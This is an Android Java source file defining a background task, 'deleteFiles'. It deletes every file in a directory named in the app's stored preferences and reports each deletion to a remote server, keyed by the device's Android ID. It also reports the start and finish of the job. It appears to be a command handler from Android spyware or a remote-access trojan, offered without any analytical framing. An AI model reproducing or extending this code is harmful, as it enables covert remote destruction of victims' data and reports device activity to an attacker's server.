package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.File;
import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class deleteFiles extends AsyncTask<String, Void, String> {
    String i = "0";
    public deleteFiles(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {

        File directory = new File(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("File", "") + File.separator + i);
//        	Log.i("com.connect", "Delete Files : " + directory.exists() + " : " + directory.toString());

        if(directory.exists()){
            File[] files = directory.listFiles();
            for(int j=0; j<files.length; j++)
            {
//		            	Log.i("com.connect", "File Deleted : " + files[j].toString());

                files[j].delete();
                try {
                    Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "File Deleted: " + files[j].toString());
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
        }

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Files",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", i + " Deleted");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }        }
    @Override
    protected void onPreExecute() {try {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Files",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Files",true).commit();
        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Deleting " + i);
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }        }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
